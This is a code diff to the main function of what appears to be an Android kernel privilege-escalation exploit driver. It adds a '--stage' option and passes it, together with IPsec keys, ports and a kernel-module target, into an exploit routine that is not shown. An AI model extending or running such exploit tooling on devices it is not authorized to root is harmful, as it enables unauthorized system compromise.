@@ -13,7 +13,8 @@
 
 int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
-               const char *ko_target, const char *package_name, int soft_reboot);
+               const char *ko_target, const char *package_name, int soft_reboot,
+               int stage);
 
 extern const char *g_data_dir;
 
@@ -70,6 +71,7 @@ int main(int argc, char **argv) {
     const char *ksud_src = NULL;
     const char *package_name = NULL;
     int soft_reboot = 0;
+    int stage = 0;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -89,6 +91,8 @@ int main(int argc, char **argv) {
             ksud_src = argv[++i];
         else if (!strcmp(a, "--pkg") && i + 1 < argc)
             package_name = argv[++i];
+        else if (!strcmp(a, "--stage") && i + 1 < argc)
+            stage = atoi(argv[++i]);
         else if (!strcmp(a, "--soft-reboot"))
             soft_reboot = 1;
         else {
@@ -105,6 +109,8 @@ int main(int argc, char **argv) {
     REPORTLN("=== setup ===");
     REPORTLN("encap port: %d", encap_port);
     REPORTLN("spi: 0x%x", spi);
+    if (stage)
+        REPORTLN("stage: %d", stage);
     /* The app copies the manager's ksud here before either run mode, because
      * under Shizuku this process is shell and can read neither /data/app nor
      * the app's dir. Root is what execs it, so no further staging is needed. */
@@ -122,5 +128,5 @@ int main(int argc, char **argv) {
     REPORTLN("");
     REPORTLN("=== exploit ===");
     return dfroot_run(encap_port, sender_port, spi, icv_len, aes_key, hmac_key,
-                      ko_target, package_name, soft_reboot);
+                      ko_target, package_name, soft_reboot, stage);
 }
